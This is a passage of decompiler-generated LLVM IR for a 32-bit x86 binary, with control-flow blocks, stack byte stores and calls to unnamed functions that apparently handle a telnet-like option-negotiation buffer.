  %v6_804e57b = and i32 %v1_804e576, -256
  %v7_804e57b = or i32 %v4_804e57b, %v6_804e57b
  %v1_804e584 = add i32 %v7_804e57b, 1
  store i32 %v1_804e584, i32* %eax.global-to-local, align 4
  %v1_804e585 = add i32 %v0_804e57b, 4
  %v2_804e585 = inttoptr i32 %v1_804e585 to i32*
  store i32 -1, i32* %v2_804e585, align 4
  %v0_804e58c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e58c = trunc i32 %v0_804e58c to i8
  %v2_804e58c = load i32, i32* @edi, align 4
  %v3_804e58c = add i32 %v2_804e58c, 284
  %v4_804e58c = inttoptr i32 %v3_804e58c to i8*
  store i8 %v1_804e58c, i8* %v4_804e58c, align 1
  %v0_804e592 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e592 = trunc i32 %v0_804e592 to i8
  %tmp307 = icmp ult i8 %v1_804e592, 10
  %v0_804ec1e = load i32, i32* @edi, align 4
  br i1 %tmp307, label %dec_label_pc_804ec1e, label %dec_label_pc_804e59a

dec_label_pc_804e59a:                             ; preds = %dec_label_pc_804e56f
  %v1_804e59a = add i32 %v0_804ec1e, 284
  %v2_804e59a = inttoptr i32 %v1_804e59a to i8*
  store i8 0, i8* %v2_804e59a, align 1
  %v0_804e5a1 = load i32, i32* @edi, align 4
  %v1_804e5a1 = add i32 %v0_804e5a1, 12
  %v2_804e5a1 = inttoptr i32 %v1_804e5a1 to i32*
  store i32 0, i32* %v2_804e5a1, align 4
  br label %dec_label_pc_804e052

dec_label_pc_804e5b0:                             ; preds = %dec_label_pc_804e170
  store i8 -4, i8* %v1_804e170, align 1
  br label %dec_label_pc_804e182

dec_label_pc_804e5b8:                             ; preds = %dec_label_pc_804e156
  %v1_804e5b8 = add i32 %v0_804e5b8, 1863
  %v2_804e5b8 = inttoptr i32 %v1_804e5b8 to i8*
  store i8 -1, i8* %v2_804e5b8, align 1
  %v0_804e5c0 = load i32, i32* @esp, align 4
  %v1_804e5c0 = add i32 %v0_804e5c0, 1864
  %v2_804e5c0 = inttoptr i32 %v1_804e5c0 to i8*
  store i8 -5, i8* %v2_804e5c0, align 1
  %v0_804e5c8 = load i32, i32* @esp, align 4
  %v1_804e5c8 = add i32 %v0_804e5c8, 1865
  %v2_804e5c8 = inttoptr i32 %v1_804e5c8 to i8*
  store i8 31, i8* %v2_804e5c8, align 1
  %v0_804e5d0 = load i32, i32* @esp, align 4
  %v1_804e5d0 = add i32 %v0_804e5d0, 1831
  %v2_804e5d0 = inttoptr i32 %v1_804e5d0 to i8*
  store i8 -1, i8* %v2_804e5d0, align 1
  %v0_804e5d8 = load i32, i32* @esp, align 4
  %v1_804e5d8 = add i32 %v0_804e5d8, 1832
  %v2_804e5d8 = inttoptr i32 %v1_804e5d8 to i8*
  store i8 -6, i8* %v2_804e5d8, align 1
  %v0_804e5e0 = load i32, i32* @esp, align 4
  %v1_804e5e0 = add i32 %v0_804e5e0, 1833
  %v2_804e5e0 = inttoptr i32 %v1_804e5e0 to i8*
  store i8 31, i8* %v2_804e5e0, align 1
  %v0_804e5e8 = load i32, i32* @esp, align 4
  %v1_804e5e8 = add i32 %v0_804e5e8, 1834
  %v2_804e5e8 = inttoptr i32 %v1_804e5e8 to i8*
  store i8 0, i8* %v2_804e5e8, align 1
  %v0_804e5f0 = load i32, i32* @esp, align 4
  %v1_804e5f0 = add i32 %v0_804e5f0, 1835
  %v2_804e5f0 = inttoptr i32 %v1_804e5f0 to i8*
  store i8 80, i8* %v2_804e5f0, align 1
  %v0_804e5f8 = load i32, i32* @esp, align 4
  %v1_804e5f8 = add i32 %v0_804e5f8, 1836
  %v2_804e5f8 = inttoptr i32 %v1_804e5f8 to i8*
  store i8 0, i8* %v2_804e5f8, align 1
  %v0_804e600 = load i32, i32* @esp, align 4
  %v1_804e600 = add i32 %v0_804e600, 1837
  %v2_804e600 = inttoptr i32 %v1_804e600 to i8*
  store i8 24, i8* %v2_804e600, align 1
  %v0_804e608 = load i32, i32* @esp, align 4
  %v1_804e608 = add i32 %v0_804e608, 1838
  %v2_804e608 = inttoptr i32 %v1_804e608 to i8*
  store i8 -1, i8* %v2_804e608, align 1
  %v0_804e610 = load i32, i32* @esp, align 4
  %v1_804e610 = add i32 %v0_804e610, 1839
  %v2_804e610 = inttoptr i32 %v1_804e610 to i8*
  store i8 -16, i8* %v2_804e610, align 1
  %v0_804e618 = load i32, i32* @esp, align 4
  %v1_804e618 = add i32 %v0_804e618, 8
  %v2_804e618 = inttoptr i32 %v1_804e618 to i32*
  %v3_804e618 = load i32, i32* %v2_804e618, align 4
  store i32 %v3_804e618, i32* %eax.global-to-local, align 4
  %v0_804e61c = load i32, i32* @edi, align 4
  %v1_804e61c = add i32 %v0_804e61c, 24
  %v2_804e61c = inttoptr i32 %v1_804e61c to i32*
  %v3_804e61c = load i32, i32* %v2_804e61c, align 4
  %v0_804e61f = load i32, i32* @ebx, align 4
  %v1_804e61f = add i32 %v0_804e61f, 2
  store i32 %v1_804e61f, i32* %edx.global-to-local, align 4
  %v2_804e622 = add i32 %v3_804e61c, %v3_804e618
  store i32 %v2_804e622, i32* %eax.global-to-local, align 4
  %tmp308 = icmp ugt i32 %v2_804e622, %v1_804e61f
  br i1 %tmp308, label %dec_label_pc_804e62c, label %dec_label_pc_804e5b8.dec_label_pc_804e1b6.loopexit_crit_edge

dec_label_pc_804e5b8.dec_label_pc_804e1b6.loopexit_crit_edge: ; preds = %dec_label_pc_804e5b8
  %v0_804e1b6.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e1b6

dec_label_pc_804e62c:                             ; preds = %dec_label_pc_804e5b8
  %v2_804e62c = inttoptr i32 %v1_804e61f to i8*
  %v3_804e62c = load i8, i8* %v2_804e62c, align 1
  %v12_804e62c = icmp eq i8 %v3_804e62c, 31
  br i1 %v12_804e62c, label %dec_label_pc_804ec3a, label %dec_label_pc_804e636

dec_label_pc_804e636:                             ; preds = %dec_label_pc_804e62c
  %v1_804e636 = inttoptr i32 %v0_804e61f to i8*
  %v2_804e636 = load i8, i8* %v1_804e636, align 1
  %v3_804e636 = zext i8 %v2_804e636 to i32
  %v5_804e636 = and i32 %v2_804e622, -256
  %v6_804e636 = or i32 %v3_804e636, %v5_804e636
  store i32 %v6_804e636, i32* %eax.global-to-local, align 4
  %v11_804e638 = icmp eq i8 %v2_804e636, -3
  %v1_804e63a = icmp eq i1 %v11_804e638, false
  br i1 %v1_804e63a, label %dec_label_pc_804ec2a, label %dec_label_pc_804e640

dec_label_pc_804e640:                             ; preds = %dec_label_pc_804e636
  store i8 -4, i8* %v1_804e636, align 1
  br label %dec_label_pc_804e170

dec_label_pc_804e648:                             ; preds = %dec_label_pc_804e182
  store i8 -3, i8* %v2_804e182, align 1
  br label %dec_label_pc_804e195

dec_label_pc_804e651:                             ; preds = %dec_label_pc_804e170
  store i8 -3, i8* %v1_804e170, align 1
  br label %dec_label_pc_804e182

dec_label_pc_804e659:                             ; preds = %dec_label_pc_804e0bc
  %v0_804e659 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804e659, i32* %edx.global-to-local, align 4
  %v1_804e65b = load i32, i32* @esp, align 4
  %v2_804e65b = add i32 %v1_804e65b, -4
  %v3_804e65b = inttoptr i32 %v2_804e65b to i32*
  store i32 %v0_804e659, i32* %v3_804e65b, align 4
  %v0_804e65c = load i32, i32* @edi, align 4
  %v1_804e65c = add i32 %v0_804e65c, 92
  store i32 %v1_804e65c, i32* %eax.global-to-local, align 4
  %v1_804e65f = add i32 %v1_804e65b, -8
  %v2_804e65f = inttoptr i32 %v1_804e65f to i32*
  store i32 192, i32* %v2_804e65f, align 4
  %v0_804e664 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e664 = add i32 %v1_804e65b, -12
  %v3_804e664 = inttoptr i32 %v2_804e664 to i32*
  store i32 %v0_804e664, i32* %v3_804e664, align 4
  %v0_804e665 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e665 = add i32 %v1_804e65b, -16
  %v3_804e665 = inttoptr i32 %v2_804e665 to i32*
  store i32 %v0_804e665, i32* %v3_804e665, align 4
  %v4_804e666 = call i32 @function_804fe45(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e666, i32* %eax.global-to-local, align 4
  %v0_804e66b = load i32, i32* @edi, align 4
  %v1_804e66b = add i32 %v0_804e66b, 24
  %v2_804e66b = inttoptr i32 %v1_804e66b to i32*
  %v3_804e66b = load i32, i32* %v2_804e66b, align 4
  %v1_804e66e = add i32 %v3_804e66b, -64
  store i32 %v1_804e66e, i32* %v2_804e66b, align 4
  br label %dec_label_pc_804e0d0

dec_label_pc_804e67c:                             ; preds = %dec_label_pc_804e21c, %dec_label_pc_804e21c, %dec_label_pc_804e21c, %dec_label_pc_804e21c
  %v1_804e67c = add i32 %v0_804e67c, 1
  store i32 %v1_804e67c, i32* @esi, align 4
  %v10_804e67f = icmp eq i32 %v0_804e67c, -2
  %v1_804e682 = icmp eq i1 %v10_804e67f, false
  br i1 %v1_804e682, label %dec_label_pc_804e972, label %dec_label_pc_804e688

dec_label_pc_804e688:                             ; preds = %dec_label_pc_804e244, %dec_label_pc_804e67c, %dec_label_pc_804e210
  %v0_804e688 = load i32, i32* @esp, align 4
  %v1_804e68b = add i32 %v0_804e688, -16
  %v2_804e68b = inttoptr i32 %v1_804e68b to i32*
  store i32 25, i32* %v2_804e68b, align 4
  %v0_804e68d = call i32 @function_804edf0()
  store i32 %v0_804e68d, i32* %eax.global-to-local, align 4
  %v0_804e692 = load i32, i32* @esp, align 4
  %v1_804e692 = inttoptr i32 %v0_804e692 to i32*
  %v2_804e692 = load i32, i32* %v1_804e692, align 4
  store i32 %v2_804e692, i32* %eax.global-to-local, align 4
  %v3_804e692 = add i32 %v0_804e692, 4
  %v1_804e693 = inttoptr i32 %v3_804e692 to i32*
  %v1_804e694 = add i32 %v0_804e692, 1864
  store i32 %v1_804e694, i32* %edx.global-to-local, align 4
  store i32 %v1_804e694, i32* %v1_804e693, align 4
  store i32 25, i32* %v1_804e692, align 4
  %v0_804e69e = call i32 @function_804ed40()
  store i32 %v0_804e69e, i32* %eax.global-to-local, align 4
  %v0_804e6a3 = load i32, i32* @esp, align 4
  %v1_804e6a3 = add i32 %v0_804e6a3, 1864
  %v2_804e6a3 = inttoptr i32 %v1_804e6a3 to i32*
  %v3_804e6a3 = load i32, i32* %v2_804e6a3, align 4
  %v1_804e6aa = add i32 %v3_804e6a3, -1
  store i32 %v1_804e6aa, i32* %edx.global-to-local, align 4
  %v2_804e6ab = add i32 %v0_804e6a3, -4
  %v3_804e6ab = inttoptr i32 %v2_804e6ab to i32*
  store i32 %v1_804e6aa, i32* %v3_804e6ab, align 4
  %v2_804e6ac = add i32 %v0_804e6a3, -8
  %v3_804e6ac = inttoptr i32 %v2_804e6ac to i32*
  store i32 %v0_804e69e, i32* %v3_804e6ac, align 4
  %v0_804e6ad = load i32, i32* @edi, align 4
  %v1_804e6ad = add i32 %v0_804e6ad, 24
  %v2_804e6ad = inttoptr i32 %v1_804e6ad to i32*
  %v3_804e6ad = load i32, i32* %v2_804e6ad, align 4
  store i32 %v3_804e6ad, i32* %eax.global-to-local, align 4
  %v2_804e6b0 = add i32 %v0_804e6a3, -12
  %v3_804e6b0 = inttoptr i32 %v2_804e6b0 to i32*
  store i32 %v3_804e6ad, i32* %v3_804e6b0, align 4
  %v1_804e6b1 = add i32 %v0_804e6a3, 24
  %v2_804e6b1 = inttoptr i32 %v1_804e6b1 to i32*
  %v3_804e6b1 = load i32, i32* %v2_804e6b1, align 4
  store i32 %v3_804e6b1, i32* %eax.global-to-local, align 4
  %v2_804e6b5 = add i32 %v0_804e6a3, -16
  %v3_804e6b5 = inttoptr i32 %v2_804e6b5 to i32*
  store i32 %v3_804e6b1, i32* %v3_804e6b5, align 4
  %v0_804e6b6 = call i32 @function_804f470()
  %v0_804e6bb = load i32, i32* @esp, align 4
  %v8_804e6be = icmp eq i32 %v0_804e6b6, -1
  %v1_804e6bf = icmp eq i1 %v8_804e6be, false
  %v2_804e6bf = zext i1 %v1_804e6bf to i32
  %v2_804e6c2 = icmp eq i1 %v1_804e6bf, false
  store i32 %v2_804e6bf, i32* %eax.global-to-local, align 4
  store i32 %v2_804e6bf, i32* @esi, align 4
  %v1_804ec7e = add i32 %v0_804e6bb, 16
  %v2_804ec7e = inttoptr i32 %v1_804ec7e to i32*
  store i32 25, i32* %v2_804ec7e, align 4
  %v0_804ec80 = call i32 @function_804ed70()
  store i32 %v0_804ec80, i32* %eax.global-to-local, align 4
  br i1 %v2_804e6c2, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e6d1

dec_label_pc_804e6d1:                             ; preds = %dec_label_pc_804e688
  %v0_804e6de = load i32, i32* @esi, align 4
  %v10_804e6de = icmp eq i32 %v0_804e6de, -1
  br i1 %v10_804e6de, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e6e7

dec_label_pc_804e6e7:                             ; preds = %dec_label_pc_804e6d1, %dec_label_pc_804e972
  %v0_804e6e7 = phi i32 [ %v0_804e6de, %dec_label_pc_804e6d1 ], [ %v0_804e6e7.pre, %dec_label_pc_804e972 ]
  %v0_804e6ef.in = load i32, i32* @esp, align 4
  %tmp140 = icmp slt i32 %v0_804e6e7, 1
  br i1 %tmp140, label %dec_label_pc_804e729, label %dec_label_pc_804e6eb

dec_label_pc_804e6eb:                             ; preds = %dec_label_pc_804e6e7
  %v0_804e6eb = load i32, i32* @edi, align 4
  %v1_804e6eb = inttoptr i32 %v0_804e6eb to i32*
  %v2_804e6eb = load i32, i32* %v1_804e6eb, align 4
  store i32 %v2_804e6eb, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e6ef = add i32 %v0_804e6ef.in, 12
  %v2_804e6ef = inttoptr i32 %v1_804e6ef to i32*
  store i32 16384, i32* %v2_804e6ef, align 4
  %v0_804e6f4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e6f4 = add i32 %v0_804e6f4, 13
  %v2_804e6f4 = inttoptr i32 %v1_804e6f4 to i8*
  %v3_804e6f4 = load i8, i8* %v2_804e6f4, align 1
  %v4_804e6f4 = zext i8 %v3_804e6f4 to i32
  %v5_804e6f4 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e6f4 = and i32 %v5_804e6f4, -256
  %v7_804e6f4 = or i32 %v6_804e6f4, %v4_804e6f4
  store i32 %v7_804e6f4, i32* %eax.global-to-local, align 4
  %v2_804e6f7 = add i32 %v0_804e6ef.in, 8
  %v3_804e6f7 = inttoptr i32 %v2_804e6f7 to i32*
  store i32 %v7_804e6f4, i32* %v3_804e6f7, align 4
  %v0_804e6f8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e6f8 = add i32 %v0_804e6f8, 4
  %v2_804e6f8 = inttoptr i32 %v1_804e6f8 to i32*
  %v3_804e6f8 = load i32, i32* %v2_804e6f8, align 4
  %v2_804e6fb = add i32 %v0_804e6ef.in, 4
  %v3_804e6fb = inttoptr i32 %v2_804e6fb to i32*
  store i32 %v3_804e6f8, i32* %v3_804e6fb, align 4
  %v0_804e6fc = load i32, i32* @edi, align 4
  %v1_804e6fc = add i32 %v0_804e6fc, 4
  %v2_804e6fc = inttoptr i32 %v1_804e6fc to i32*
  %v3_804e6fc = load i32, i32* %v2_804e6fc, align 4
  store i32 %v3_804e6fc, i32* @ebx, align 4
  %v3_804e6ff = inttoptr i32 %v0_804e6ef.in to i32*
  store i32 %v3_804e6fc, i32* %v3_804e6ff, align 4
  %v0_804e700 = call i32 @function_804fff3()
  store i32 %v0_804e700, i32* %eax.global-to-local, align 4
  %v0_804e705 = load i32, i32* @esp, align 4
  %v1_804e705 = add i32 %v0_804e705, -4
  %v2_804e705 = inttoptr i32 %v1_804e705 to i32*
  store i32 16384, i32* %v2_804e705, align 4
  %v1_804e70a = add i32 %v0_804e705, -8
  %v2_804e70a = inttoptr i32 %v1_804e70a to i32*
  store i32 2, i32* %v2_804e70a, align 4
  %v1_804e70c = add i32 %v0_804e705, -12
  %v2_804e70c = inttoptr i32 %v1_804e70c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052219.22 to i32), i32* %v2_804e70c, align 4
  %v0_804e711 = load i32, i32* @edi, align 4
  %v1_804e711 = add i32 %v0_804e711, 4
  %v2_804e711 = inttoptr i32 %v1_804e711 to i32*
  %v3_804e711 = load i32, i32* %v2_804e711, align 4
  store i32 %v3_804e711, i32* %ecx.global-to-local, align 4
  %v2_804e714 = add i32 %v0_804e705, -16
  %v3_804e714 = inttoptr i32 %v2_804e714 to i32*
  store i32 %v3_804e711, i32* %v3_804e714, align 4
  %v0_804e715 = call i32 @function_804fff3()
  store i32 %v0_804e715, i32* %eax.global-to-local, align 4
  %v0_804e71d = load i32, i32* @edi, align 4
  %v1_804e71d = add i32 %v0_804e71d, 12
  %v2_804e71d = inttoptr i32 %v1_804e71d to i32*
  store i32 5, i32* %v2_804e71d, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804e729:                             ; preds = %dec_label_pc_804e4d2, %dec_label_pc_804ea09, %dec_label_pc_804e924, %dec_label_pc_804e32a, %dec_label_pc_804e742, %dec_label_pc_804e990, %dec_label_pc_804e6e7, %dec_label_pc_804e86d, %dec_label_pc_804e1b6
  %v0_804e729 = phi i32 [ %v1_804e4c6179, %dec_label_pc_804e4d2 ], [ %v1_804e9fd, %dec_label_pc_804ea09 ], [ %v0_804e91b, %dec_label_pc_804e924 ], [ %v1_804e31e176, %dec_label_pc_804e32a ], [ %v1_804e736, %dec_label_pc_804e742 ], [ %v1_804e984, %dec_label_pc_804e990 ], [ %v0_804e6e7, %dec_label_pc_804e6e7 ], [ %v0_804e86d, %dec_label_pc_804e86d ], [ %v0_804e1b6, %dec_label_pc_804e1b6 ]
  %v1_804e729 = icmp eq i32 %v0_804e729, 0
  %v1_804e72b = icmp eq i1 %v1_804e729, false
  br i1 %v1_804e72b, label %dec_label_pc_804e418, label %dec_label_pc_804e0b5.backedge

dec_label_pc_804e736:                             ; preds = %dec_label_pc_804e2a1, %dec_label_pc_804e2a1, %dec_label_pc_804e2a1, %dec_label_pc_804e2a1, %dec_label_pc_804e2a1
  %v1_804e736 = add i32 %v0_804e736, 1
  store i32 %v1_804e736, i32* @esi, align 4
  %v10_804e739 = icmp eq i32 %v0_804e736, -2
  br i1 %v10_804e739, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e742

dec_label_pc_804e742:                             ; preds = %dec_label_pc_804e736
  %tmp141 = icmp slt i32 %v1_804e736, 1
  br i1 %tmp141, label %dec_label_pc_804e729, label %dec_label_pc_804e746

dec_label_pc_804e746:                             ; preds = %dec_label_pc_804e742
  %v0_804e746 = load i32, i32* @esp, align 4
  %v1_804e749 = add i32 %v0_804e746, -16
  %v2_804e749 = inttoptr i32 %v1_804e749 to i32*
  store i32 7, i32* %v2_804e749, align 4
  %v0_804e74b = call i32 @function_804edf0()
  store i32 %v0_804e74b, i32* %eax.global-to-local, align 4
  %v0_804e750 = load i32, i32* @esp, align 4
  %v1_804e750 = inttoptr i32 %v0_804e750 to i32*
  %v2_804e750 = load i32, i32* %v1_804e750, align 4
  store i32 %v2_804e750, i32* %eax.global-to-local, align 4
  %v3_804e750 = add i32 %v0_804e750, 4
  %v1_804e751 = inttoptr i32 %v3_804e750 to i32*
  %v2_804e751 = load i32, i32* %v1_804e751, align 4
  store i32 %v2_804e751, i32* %edx.global-to-local, align 4
  %v1_804e752 = add i32 %v0_804e750, 1864
  store i32 %v1_804e752, i32* %eax.global-to-local, align 4
  store i32 %v1_804e752, i32* %v1_804e751, align 4
  store i32 7, i32* %v1_804e750, align 4
  %v0_804e75c = call i32 @function_804ed40()
  store i32 %v0_804e75c, i32* %eax.global-to-local, align 4
  %v0_804e761 = load i32, i32* @esp, align 4
  %v1_804e761 = add i32 %v0_804e761, -4
  %v2_804e761 = inttoptr i32 %v1_804e761 to i32*
  store i32 16384, i32* %v2_804e761, align 4
  %v1_804e766 = add i32 %v0_804e761, 1864
  %v2_804e766 = inttoptr i32 %v1_804e766 to i32*
  %v3_804e766 = load i32, i32* %v2_804e766, align 4
  %v2_804e76d = add i32 %v0_804e761, -8
  %v3_804e76d = inttoptr i32 %v2_804e76d to i32*
  store i32 %v3_804e766, i32* %v3_804e76d, align 4
  %v2_804e76e = add i32 %v0_804e761, -12
  %v3_804e76e = inttoptr i32 %v2_804e76e to i32*
  store i32 %v0_804e75c, i32* %v3_804e76e, align 4
  %v0_804e76f = load i32, i32* @edi, align 4
  %v1_804e76f = add i32 %v0_804e76f, 4
  %v2_804e76f = inttoptr i32 %v1_804e76f to i32*
  %v3_804e76f = load i32, i32* %v2_804e76f, align 4
  store i32 %v3_804e76f, i32* @ebx, align 4
  %v2_804e772 = add i32 %v0_804e761, -16
  %v3_804e772 = inttoptr i32 %v2_804e772 to i32*
  store i32 %v3_804e76f, i32* %v3_804e772, align 4
  %v0_804e773 = call i32 @function_804fff3()
  store i32 %v0_804e773, i32* %eax.global-to-local, align 4
  %v0_804e778 = load i32, i32* @esp, align 4
  %v1_804e77b = add i32 %v0_804e778, 28
  %v2_804e77b = inttoptr i32 %v1_804e77b to i32*
  store i32 16384, i32* %v2_804e77b, align 4
  %v1_804e780 = add i32 %v0_804e778, 24
  %v2_804e780 = inttoptr i32 %v1_804e780 to i32*
  store i32 2, i32* %v2_804e780, align 4
  %v1_804e782 = add i32 %v0_804e778, 20
  %v2_804e782 = inttoptr i32 %v1_804e782 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052219.22 to i32), i32* %v2_804e782, align 4
  %v0_804e787 = load i32, i32* @edi, align 4
  %v1_804e787 = add i32 %v0_804e787, 4
  %v2_804e787 = inttoptr i32 %v1_804e787 to i32*
  %v3_804e787 = load i32, i32* %v2_804e787, align 4
  store i32 %v3_804e787, i32* %ecx.global-to-local, align 4
  %v2_804e78a = add i32 %v0_804e778, 16
  %v3_804e78a = inttoptr i32 %v2_804e78a to i32*
  store i32 %v3_804e787, i32* %v3_804e78a, align 4
  %v0_804e78b = call i32 @function_804fff3()
  store i32 %v0_804e78b, i32* %eax.global-to-local, align 4
  %v0_804e790 = load i32, i32* @esp, align 4
  %v1_804e790 = inttoptr i32 %v0_804e790 to i32*
  store i32 7, i32* %v1_804e790, align 4
  %v0_804e797 = call i32 @function_804ed70()
  store i32 %v0_804e797, i32* %eax.global-to-local, align 4
  %v0_804e79f = load i32, i32* @edi, align 4
  %v1_804e79f = add i32 %v0_804e79f, 12
  %v2_804e79f = inttoptr i32 %v1_804e79f to i32*
  store i32 9, i32* %v2_804e79f, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804e7ab:                             ; preds = %dec_label_pc_804e1d6, %dec_label_pc_804e1d6, %dec_label_pc_804e1d6, %dec_label_pc_804e1d6, %dec_label_pc_804e1d6
  %v1_804e7ab = add i32 %v0_804e7ab, 1
  store i32 %v1_804e7ab, i32* @esi, align 4
  %v10_804e7ae = icmp eq i32 %v0_804e7ab, -2
  %v1_804e7b1 = icmp eq i1 %v10_804e7ae, false
  br i1 %v1_804e7b1, label %dec_label_pc_804e8b2, label %dec_label_pc_804e7b7

dec_label_pc_804e7b7:                             ; preds = %dec_label_pc_804e207, %dec_label_pc_804e7ab, %dec_label_pc_804e1ca
  %v0_804e7b7 = load i32, i32* @esp, align 4
  %v1_804e7ba = add i32 %v0_804e7b7, -16
  %v2_804e7ba = inttoptr i32 %v1_804e7ba to i32*
  store i32 26, i32* %v2_804e7ba, align 4
  %v0_804e7bc = call i32 @function_804edf0()
  store i32 %v0_804e7bc, i32* %eax.global-to-local, align 4
  %v0_804e7c1 = load i32, i32* @esp, align 4
  %v1_804e7c1 = inttoptr i32 %v0_804e7c1 to i32*
  store i32 27, i32* %v1_804e7c1, align 4
  %v0_804e7c8 = call i32 @function_804edf0()
  store i32 %v0_804e7c8, i32* %eax.global-to-local, align 4
  %v0_804e7cd = load i32, i32* @esp, align 4
  %v1_804e7cd = inttoptr i32 %v0_804e7cd to i32*
  %v2_804e7cd = load i32, i32* %v1_804e7cd, align 4
  store i32 %v2_804e7cd, i32* %ecx.global-to-local, align 4
  %v3_804e7cd = add i32 %v0_804e7cd, 4
  %v1_804e7ce = inttoptr i32 %v3_804e7cd to i32*
  %v2_804e7ce = load i32, i32* %v1_804e7ce, align 4
  store i32 %v2_804e7ce, i32* %ebx.global-to-local, align 4
  %v1_804e7cf = add i32 %v0_804e7cd, 1864
  store i32 %v1_804e7cf, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e7cf, i32* %v1_804e7ce, align 4
  store i32 26, i32* %v1_804e7cd, align 4
  %v0_804e7d9 = call i32 @function_804ed40()
  store i32 %v0_804e7d9, i32* %eax.global-to-local, align 4
  store i32 %v0_804e7d9, i32* @ebx, align 4
  %v0_804e7e0 = load i32, i32* @esp, align 4
  %v1_804e7e0 = inttoptr i32 %v0_804e7e0 to i32*
  %v2_804e7e0 = load i32, i32* %v1_804e7e0, align 4
  store i32 %v2_804e7e0, i32* %eax.global-to-local, align 4
  %v3_804e7e0 = add i32 %v0_804e7e0, 4
  %v1_804e7e1 = inttoptr i32 %v3_804e7e0 to i32*
  %v2_804e7e1 = load i32, i32* %v1_804e7e1, align 4
  store i32 %v2_804e7e1, i32* %edx.global-to-local, align 4
  %v1_804e7e2 = add i32 %v0_804e7e0, 1864
  store i32 %v1_804e7e2, i32* %eax.global-to-local, align 4
  store i32 %v1_804e7e2, i32* %v1_804e7e1, align 4
  store i32 27, i32* %v1_804e7e0, align 4
  %v0_804e7ec = call i32 @function_804ed40()
  store i32 %v0_804e7ec, i32* %eax.global-to-local, align 4
  store i32 %v0_804e7ec, i32* @ebp, align 4
  %v0_804e7f3 = load i32, i32* @esp, align 4
  %v1_804e7f3 = add i32 %v0_804e7f3, 1864
  %v2_804e7f3 = inttoptr i32 %v1_804e7f3 to i32*
  %v3_804e7f3 = load i32, i32* %v2_804e7f3, align 4
  %v1_804e7fa = add i32 %v3_804e7f3, -1
  store i32 %v1_804e7fa, i32* %eax.global-to-local, align 4
  %v2_804e7fb = add i32 %v0_804e7f3, -4
  %v3_804e7fb = inttoptr i32 %v2_804e7fb to i32*
  store i32 %v1_804e7fa, i32* %v3_804e7fb, align 4
  %v0_804e7fc = load i32, i32* @ebx, align 4
  %v2_804e7fc = add i32 %v0_804e7f3, -8
  %v3_804e7fc = inttoptr i32 %v2_804e7fc to i32*
  store i32 %v0_804e7fc, i32* %v3_804e7fc, align 4
  %v0_804e7fd = load i32, i32* @edi, align 4
  %v1_804e7fd = add i32 %v0_804e7fd, 24
  %v2_804e7fd = inttoptr i32 %v1_804e7fd to i32*
  %v3_804e7fd = load i32, i32* %v2_804e7fd, align 4
  store i32 %v3_804e7fd, i32* %eax.global-to-local, align 4
  %v2_804e800 = add i32 %v0_804e7f3, -12
  %v3_804e800 = inttoptr i32 %v2_804e800 to i32*
  store i32 %v3_804e7fd, i32* %v3_804e800, align 4
  %v1_804e801 = add i32 %v0_804e7f3, 24
  %v2_804e801 = inttoptr i32 %v1_804e801 to i32*
  %v3_804e801 = load i32, i32* %v2_804e801, align 4
  store i32 %v3_804e801, i32* %eax.global-to-local, align 4
  %v2_804e805 = add i32 %v0_804e7f3, -16
  %v3_804e805 = inttoptr i32 %v2_804e805 to i32*
  store i32 %v3_804e801, i32* %v3_804e805, align 4
  %v0_804e806 = call i32 @function_804f470()
  %v0_804e80b = load i32, i32* @esp, align 4
  %v1_804e80b = add i32 %v0_804e80b, 32
  %v8_804e80e = icmp eq i32 %v0_804e806, -1
  %v1_804e80f = icmp eq i1 %v8_804e80e, false
  %v2_804e80f = zext i1 %v1_804e80f to i32
  %v2_804e812 = icmp eq i1 %v1_804e80f, false
  store i32 %v2_804e80f, i32* %eax.global-to-local, align 4
  store i32 %v2_804e80f, i32* @esi, align 4
  %v1_804e81b = icmp eq i1 %v2_804e812, false
  br i1 %v1_804e81b, label %dec_label_pc_804e84b, label %dec_label_pc_804e81d

dec_label_pc_804e81d:                             ; preds = %dec_label_pc_804e7b7
  %v1_804e81d = add i32 %v0_804e80b, 1880
  %v2_804e81d = inttoptr i32 %v1_804e81d to i32*
  %v3_804e81d = load i32, i32* %v2_804e81d, align 4
  %v1_804e824 = add i32 %v3_804e81d, -1
  store i32 %v1_804e824, i32* %eax.global-to-local, align 4
  %v2_804e825 = add i32 %v0_804e80b, 28
  %v3_804e825 = inttoptr i32 %v2_804e825 to i32*
  store i32 %v1_804e824, i32* %v3_804e825, align 4
  %v0_804e826 = load i32, i32* @ebp, align 4
  %v2_804e826 = add i32 %v0_804e80b, 24
  %v3_804e826 = inttoptr i32 %v2_804e826 to i32*
  store i32 %v0_804e826, i32* %v3_804e826, align 4
  %v0_804e827 = load i32, i32* @edi, align 4
  %v1_804e827 = add i32 %v0_804e827, 24
  %v2_804e827 = inttoptr i32 %v1_804e827 to i32*
  %v3_804e827 = load i32, i32* %v2_804e827, align 4
  store i32 %v3_804e827, i32* %eax.global-to-local, align 4
  %v2_804e82a = add i32 %v0_804e80b, 20
  %v3_804e82a = inttoptr i32 %v2_804e82a to i32*
  store i32 %v3_804e827, i32* %v3_804e82a, align 4
  %v1_804e82b = add i32 %v0_804e80b, 40
  %v2_804e82b = inttoptr i32 %v1_804e82b to i32*
  %v3_804e82b = load i32, i32* %v2_804e82b, align 4
  store i32 %v3_804e82b, i32* %eax.global-to-local, align 4
  %v2_804e82f = add i32 %v0_804e80b, 16
  %v3_804e82f = inttoptr i32 %v2_804e82f to i32*
